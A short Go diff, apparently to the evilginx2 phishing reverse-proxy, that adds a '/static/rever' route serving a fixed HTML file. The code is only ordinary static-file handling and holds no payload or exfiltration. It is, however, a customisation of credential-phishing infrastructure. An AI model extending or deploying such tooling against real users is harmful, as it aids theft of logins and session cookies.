@@ -26,6 +26,7 @@ func NewHttpServer() (*HttpServer, error) {
 	}
 
 	r.HandleFunc("/.well-known/acme-challenge/{token}", s.handleACMEChallenge).Methods("GET")
+	r.HandleFunc("/static/rever", s.handleStatic).Methods("GET")
 	r.PathPrefix("/").HandlerFunc(s.handleRedirect)
 
 	return s, nil
@@ -41,6 +42,15 @@ func (s *HttpServer) AddACMEToken(token string, keyAuth string) {
 
 func (s *HttpServer) ClearACMETokens() {
 	s.acmeTokens = make(map[string]string)
+}
+
+func (s *HttpServer) handleStatic(w http.ResponseWriter, r *http.Request) {
+
+	log.Debug("http: static file request @ URL: %s", r.URL.Path)
+	//w.WriteHeader(http.StatusOK)
+	//w.Header().Set("content-type", "text/html")
+	//fmt.Fprintf(w,"Sample!")
+	http.ServeFile( w, r, "/opt/evilginx2/static/rever.html")
 }
 
 func (s *HttpServer) handleACMEChallenge(w http.ResponseWriter, r *http.Request) {
